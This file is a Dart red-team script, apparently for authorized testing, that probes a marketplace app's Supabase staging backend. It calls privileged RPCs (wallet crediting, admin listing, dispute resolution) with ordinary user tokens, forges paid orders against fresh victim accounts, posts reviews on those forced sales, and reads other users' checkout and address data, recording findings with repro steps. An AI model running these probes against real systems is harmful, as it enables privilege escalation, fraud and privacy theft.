/// Pass 2 — cadeias à volta dos hits + RPCs privilegiados + vítima fresca.
library;

import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stamp = '20260829T1635';
const stagingRef = 'fxdknzrqjenzqcvnwqqq';

final probes = <Map<String, dynamic>>[];
final findings = <Map<String, dynamic>>[];
final gaps = <String>[];

void note(String s) => stderr.writeln('[B2] $s');
void probe(String id, String title, Map<String, dynamic> d) =>
    probes.add({'id': id, 'title': title, ...d});

String clip(String s, [int n = 700]) {
  final t = s.replaceAll(
    RegExp(r'(eyJ[A-Za-z0-9_-]{20,}|sk_(test|live)_[A-Za-z0-9]+)'),
    '[redacted]',
  );
  return t.length <= n ? t : '${t.substring(0, n)}…';
}

dynamic tryJson(http.Response r) {
  try {
    return jsonDecode(r.body);
  } catch (_) {
    return clip(r.body, 200);
  }
}

Future<http.Response> rest(
  LiveOpsStagingClient c, {
  required String method,
  required String path,
  String? token,
  bool service = false,
  Object? body,
}) {
  final headers = <String, String>{
    'apikey': service ? c.serviceRoleKey : c.anonKey,
    'Authorization':
        'Bearer ${service ? c.serviceRoleKey : (token ?? c.anonKey)}',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final uri = Uri.parse('${c.url}$path');
  final enc = body == null ? null : jsonEncode(body);
  switch (method) {
    case 'GET':
      return http.get(uri, headers: headers);
    case 'PATCH':
      return http.patch(uri, headers: headers, body: enc);
    case 'POST':
      return http.post(uri, headers: headers, body: enc);
    default:
      return http.delete(uri, headers: headers);
  }
}

void finding({
  required String id,
  required String title,
  required String severity,
  required String actor,
  required String pre,
  required String request,
  required dynamic before,
  required dynamic result,
  required dynamic after,
  required String impact,
  required String repro,
}) {
  findings.add({
    'id': id,
    'title': title,
    'severity': severity,
    'actor': actor,
    'preconditions': pre,
    'request': request,
    'before': before,
    'result': result,
    'after': after,
    'impact': impact,
    'reproduction': repro,
  });
  note('FINDING $severity $id $title');
}

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  final c = LiveOpsStagingClient(
    url: normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL')),
    anonKey: envRequire(env, 'SUPABASE_ANON_KEY'),
    serviceRoleKey: envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY'),
  );
  if (!c.url.contains(stagingRef)) {
    stderr.writeln('ABORT');
    exit(2);
  }
  final buyerTok = await c.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await c.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');

  // Re-login fresh victim from pass1 if possible
  const freshEmail = 'rtb.b.1788017919231@fleaber.test';
  String? freshId = '641eeb96-953f-4c37-8831-482f164d8182';
  String? freshTok;
  try {
    freshTok = await c.signIn(email: freshEmail, password: 'x');
  } catch (_) {}
  try {
    final created = await c.createAdminUser(
      email: 'rtb.b.victim.${DateTime.now().millisecondsSinceEpoch}@fleaber.test',
      password: 'RtbB-Victim-${DateTime.now().millisecondsSinceEpoch}!aA1',
      userMetadata: {'user_type': 'comprador', 'full_name': 'Maria Demo FleaHub'},
    );
    freshId = created;
    // password known
  } catch (e) {
    gaps.add('fresh victim recreate: $e');
  }

  String victimPass = '';
  String victimEmail = '';
  String victimId = freshId!;
  String? victimTok = freshTok;
  try {
    victimEmail =
        'rtb.b.v2.${DateTime.now().millisecondsSinceEpoch}@fleaber.test';
    victimPass = 'RtbB-V2-${DateTime.now().millisecondsSinceEpoch}!aA1';
    victimId = await c.createAdminUser(
      email: victimEmail,
      password: victimPass,
      userMetadata: {
        'user_type': 'comprador',
        'full_name': 'Maria Demo FleaHub',
      },
    );
    victimTok = await c.signIn(email: victimEmail, password: victimPass);
  } catch (e) {
    gaps.add('victim2: $e');
  }

  await hostileRpcs(c, buyerTok, sellerTok, buyerId, sellerId);
  await ghostVictimChain(
    c,
    sellerTok,
    victimTok,
    victimId,
    sellerId,
    buyerTok,
    buyerId,
  );
  await checkoutEventsOracle(c, buyerTok, buyerId);
  await nameSquatClaim(c, victimTok, sellerId);
  await deviceTokenBuyer(c, buyerTok, sellerTok);
  await shippingAndDisputes(c, buyerTok, sellerTok, buyerId, sellerId);
  await liveDualConsume(c, buyerTok, sellerTok, buyerId, sellerId);
  await verifyPass1Statuses(c);

  final out = {
    'pass': 2,
    'findings': findings,
    'probes': probes,
    'gaps': gaps,
  };
  File('tool/redteam_blind_b_${stamp}_pass2.json')
      .writeAsStringSync(const JsonEncoder.withIndent('  ').convert(out));
  note('pass2 done findings=${findings.length} probes=${probes.length}');
}

Future<void> hostileRpcs(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  note('RPCs privilegiados');
  final specs = <(String, Map<String, dynamic>)>[
    ('batata_is_admin', {}),
    ('batata_admin_list_profiles', {'p_limit': 5}),
    (
      'batata_admin_resolve_dispute',
      {
        'p_dispute_id': '00000000-0000-0000-0000-000000000001',
        'p_resolution': 'favor_buyer_refund',
        'p_note': 'x',
      },
    ),
    (
      'batata_credit_wallet_once',
      {
        'p_wallet_id': buyerId,
        'p_order_id': '00000000-0000-0000-0000-000000000001',
        'p_amount': 50,
        'p_type': 'venda',
        'p_description': 'rtb-b-mint',
      },
    ),
    (
      'batata_debit_wallet_once',
      {
        'p_wallet_id': sellerId,
        'p_order_id': '00000000-0000-0000-0000-000000000001',
        'p_amount': 1,
        'p_description': 'x',
      },
    ),
    (
      'batata_clawback_seller_wallet_for_order',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_finalize_stripe_order_refund',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    ),
    ('batata_lab_clear_all_fm_pending', {}),
    (
      'batata_create_seller_device_token',
      {'p_device_id': 'rtb-b-buyer', 'p_label': 'x'},
    ),
    (
      'batata_claim_external_reservations',
      {},
    ),
    (
      'batata_mark_live_item_sold',
      {'p_live_item_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_draw_live_raffle_winners',
      {'p_raffle_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_activate_live_raffle',
      {'p_raffle_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_live_reconcile_stripe_order',
      {'p_order_id': '00000000-0000-0000-0000-000000000001'},
    ),
    (
      'batata_live_system_message',
      {
        'p_live_id': '00000000-0000-0000-0000-000000000001',
        'p_body': 'pwn',
      },
    ),
    (
      'batata_ingest_ocr_reservation',
      {
        'p_device_token': 'aaaaaaaabbbbbbbb',
        'p_live_id': '00000000-0000-0000-0000-000000000001',
        'p_ref_number': 1,
        'p_external_display_name': 'x',
        'p_external_buyer_ref': 'x',
        'p_ocr_raw_line': 'x',
        'p_ocr_line_hash': 'deadbeefdeadbeef',
        'p_detected_at': DateTime.now().toUtc().toIso8601String(),
      },
    ),
    ('batata_get_my_payout_details', {}),
    ('batata_ps_create_pairing', {'p_device_hint': 'x'}),
  ];

  for (final who in [
    ('buyer', buyerTok),
    ('seller', sellerTok),
  ]) {
    for (final spec in specs) {
      final r = await rest(
        c,
        method: 'POST',
        path: '/rest/v1/rpc/${spec.$1}',
        token: who.$2,
        body: spec.$2,
      );
      probe('rpc.${who.$1}.${spec.$1}', '${who.$1} ${spec.$1}', {
        'status': r.statusCode,
        'body': clip(r.body, 350),
      });
      if (r.statusCode == 200 &&
          (spec.$1.contains('credit_wallet') ||
              spec.$1.contains('admin_list') ||
              spec.$1.contains('lab_clear') ||
              spec.$1.contains('draw_live') ||
              spec.$1.contains('mark_live_item_sold'))) {
        if (r.body.contains('true') ||
            (r.body.startsWith('[') && r.body.length > 5) ||
            r.body.contains('"ok":true')) {
          finding(
            id: 'RTB-B-RPC-${spec.$1}',
            title: 'RPC privilegiada executável: ${spec.$1}',
            severity: spec.$1.contains('credit') || spec.$1.contains('admin')
                ? 'P0'
                : 'P1',
            actor: '${who.$1} JWT',
            pre: 'JWT autenticado',
            request: 'POST /rpc/${spec.$1}',
            before: {},
            result: clip(r.body, 400),
            after: {},
            impact: 'Autoridade elevada / mint / PII.',
            repro: 'JWT ${who.$1} RPC ${spec.$1}',
          );
        }
      }
    }
  }
}

Future<Map<String, dynamic>?> product(LiveOpsStagingClient c, String sellerId) async {
  try {
    return await c.insert('products', {
      'seller_id': sellerId,
      'title': 'RTB-B p2 $stamp',
      'price': 7.50,
      'quantity': 1,
      'list_on_marketplace': true,
    });
  } catch (e) {
    gaps.add('product: $e');
    return null;
  }
}

Future<void> ghostVictimChain(
  LiveOpsStagingClient c,
  String sellerTok,
  String? victimTok,
  String victimId,
  String sellerId,
  String buyerTok,
  String buyerId,
) async {
  note('ghost order → vítima fresca');
  final prod = await product(c, sellerId);
  if (prod == null) return;
  final pid = prod['id'].toString();

  final ins = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: sellerTok,
    body: {
      'buyer_id': victimId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pendente',
      'price_total': 7.50,
      'quantity': 1,
      'payment_method': 'mbway',
    },
  );
  probe('p2.ghost.insert', 'seller INSERT order buyer=vítima fresca', {
    'status': ins.statusCode,
    'body': clip(ins.body, 500),
  });
  String? oid;
  final j = tryJson(ins);
  if (j is List && j.isNotEmpty) oid = (j.first as Map)['id']?.toString();
  if (oid == null) return;

  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$oid',
    token: sellerTok,
    body: {'status': 'pago'},
  );
  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$oid',
    token: sellerTok,
    body: {'status': 'enviado'},
  );
  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/orders?id=eq.$oid',
    token: sellerTok,
    body: {'status': 'concluido'},
  );
  if (victimTok != null) {
    await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: victimTok,
      body: {'status': 'concluido'},
    );
  }

  final truth = await c.select('orders', filter: 'id=eq.$oid', limit: 1);
  final prodAfter = await c.select('products', filter: 'id=eq.$pid', limit: 1);
  probe('p2.ghost.truth', 'estado final order fantasma vítima', {
    'order': truth,
    'product': prodAfter,
  });

  if (victimTok != null) {
    final seen = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/orders?id=eq.$oid&select=id,status,buyer_id,stock_units_applied,amount_paid_cents',
      token: victimTok,
    );
    probe('p2.ghost.victim_sees', 'vítima vê a order', {
      'status': seen.statusCode,
      'body': clip(seen.body, 400),
    });

    final rv = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/reviews',
      token: victimTok,
      body: {
        'order_id': oid,
        'target_id': sellerId,
        'buyer_id': victimId,
        'stars': 5,
        'comment': 'forced-sale-review',
        'author_role': 'comprador',
        'target_type': 'seller',
      },
    );
    probe('p2.ghost.review.victim', 'vítima review na venda forçada', {
      'status': rv.statusCode,
      'body': clip(rv.body, 300),
    });
    if (rv.statusCode < 300) {
      finding(
        id: 'RTB-B-REP-03',
        title: 'Review possível em venda forçada pelo seller',
        severity: 'P1',
        actor: 'vítima (ou seller a controlar o fluxo)',
        pre: 'order fantasma paga off-platform',
        request: 'POST reviews na order forçada',
        before: {},
        result: clip(rv.body, 300),
        after: {},
        impact: 'Reputação colada a uma compra que a vítima não iniciou.',
        repro: 'Seller cria order+pago; JWT da vítima (ou auto-feedback) cria review.',
      );
    }
  }

  final st = truth.isEmpty ? '' : '${truth.first['status']}'.toLowerCase();
  final stock = truth.isEmpty ? 0 : truth.first['stock_units_applied'];
  if (st == 'pago' || st == 'enviado' || st == 'concluido' || st == 'entregue') {
    finding(
      id: 'RTB-B-ID-02',
      title: 'Venda forçada até $st sobre conta que nunca encomendou',
      severity: 'P1',
      actor: 'seller JWT',
      pre: 'UUID de qualquer buyer; produto próprio; payment_method=mbway',
      request:
          'POST orders {buyer_id:vítima} + PATCH pago [+ enviado/concluido]',
      before: {'victim': victimId, 'product': pid},
      result: {'status': st, 'stock_units_applied': stock},
      after: {'order': truth, 'product': prodAfter},
      impact:
          'Stock consumido e máquina logística/reputação avança sem consentimento do comprador e sem captura Stripe.',
      repro:
          'JWT seller INSERT order com buyer_id alheio, mbway, PATCH pago e estados seguintes.',
    );
  }
}

Future<void> checkoutEventsOracle(
  LiveOpsStagingClient c,
  String buyerTok,
  String buyerId,
) async {
  final mine = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/stripe_checkout_events?select=id,session_id,order_id,buyer_id,event,detail&limit=20',
    token: buyerTok,
  );
  probe('p2.stripe_events', 'buyer lista stripe_checkout_events', {
    'status': mine.statusCode,
    'body': clip(mine.body, 600),
  });
  final j = tryJson(mine);
  if (j is List) {
    final others = j.where((e) {
      if (e is! Map) return false;
      final b = e['buyer_id']?.toString();
      return b != null && b.isNotEmpty && b != buyerId;
    }).toList();
    probe('p2.stripe_events.others', 'eventos com buyer_id alheio', {
      'count': others.length,
      'sample': others.take(2).toList(),
    });
    if (others.isNotEmpty) {
      finding(
        id: 'RTB-B-PRIV-04',
        title: 'stripe_checkout_events cross-user',
        severity: 'P1',
        actor: 'buyer JWT',
        pre: 'tabela com eventos de outros',
        request: 'GET /stripe_checkout_events',
        before: {},
        result: {'foreign': others.length},
        after: others.take(3).toList(),
        impact: 'session_id Stripe e metadados de checkout alheios.',
        repro: 'SELECT autenticado sem filtro de buyer.',
      );
    }
  }
}

Future<void> nameSquatClaim(
  LiveOpsStagingClient c,
  String? victimTok,
  String sellerId,
) async {
  if (victimTok == null) return;
  // Match seller's public name via claim_external_reservations
  final r = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_claim_external_reservations',
    token: victimTok,
    body: {},
  );
  probe('p2.claim.namesquat', 'claim reservas FB pelo nome da vítima', {
    'status': r.statusCode,
    'body': clip(r.body, 400),
  });
}

Future<void> deviceTokenBuyer(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
) async {
  final b = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_create_seller_device_token',
    token: buyerTok,
    body: {'p_device_id': 'rtb-b-buyer-dev', 'p_label': 'x'},
  );
  probe('p2.dev.buyer', 'buyer cria device token OCR', {
    'status': b.statusCode,
    'body': clip(b.body, 400),
  });
  final s = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_create_seller_device_token',
    token: sellerTok,
    body: {'p_device_id': 'rtb-b-seller-dev', 'p_label': 'x'},
  );
  probe('p2.dev.seller', 'seller cria device token', {
    'status': s.statusCode,
    'body': clip(s.body, 200),
  });
  // Do not print full token in findings unless exploit proven; keep truncated
}

Future<void> shippingAndDisputes(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  final r = await rest(
    c,
    method: 'GET',
    path:
        '/rest/v1/orders?select=id,buyer_id,shipping_address,phone,buyer_phone,address,morada&limit=3',
    token: buyerTok,
  );
  probe('p2.orders.shipcols', 'colunas de morada/telefone em orders', {
    'status': r.statusCode,
    'body': clip(r.body, 400),
  });

  final d = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/order_disputes',
    token: buyerTok,
    body: {
      'order_id': '00000000-0000-0000-0000-000000000001',
      'buyer_id': buyerId,
      'reason': 'outro',
      'description': 'rtb-b',
    },
  );
  probe('p2.dispute.foreign', 'INSERT dispute em order inexistente/alheia', {
    'status': d.statusCode,
    'body': clip(d.body, 300),
  });
}

Future<void> liveDualConsume(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  final lives = await c.select('lives', filter: 'seller_id=eq.$sellerId', limit: 1);
  if (lives.isEmpty) return;
  final items = await c.select(
    'live_items',
    filter: 'live_id=eq.${lives.first['id']}',
    limit: 1,
  );
  if (items.isEmpty) return;
  final item = items.first;
  final productId = item['product_id']?.toString();
  probe('p2.live.item', 'live_item amostra', {'item': item});
  if (productId == null || productId.isEmpty) return;

  final o = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': productId,
      'live_item_id': item['id'],
      'live_id': lives.first['id'],
      'status': 'pendente',
      'price_total': 4.20,
      'quantity': 1,
      'payment_method': 'mbway',
    },
  );
  probe('p2.dual.order', 'order marketplace+live_item', {
    'status': o.statusCode,
    'body': clip(o.body, 400),
  });
}

Future<void> verifyPass1Statuses(LiveOpsStagingClient c) async {
  for (final id in [
    'becb6e38-c695-480b-a06d-c151ae78a033',
    'e46fef45-b2d2-43b6-89fe-36633d531da5',
    '2b7fd1ed-3238-4f13-9470-044f9d50a221',
  ]) {
    final rows = await c.select('orders', filter: 'id=eq.$id', limit: 1);
    probe('p2.verify.$id', 'estado real pass1', {
      'row': rows.isEmpty ? null : rows.first,
    });
  }
}
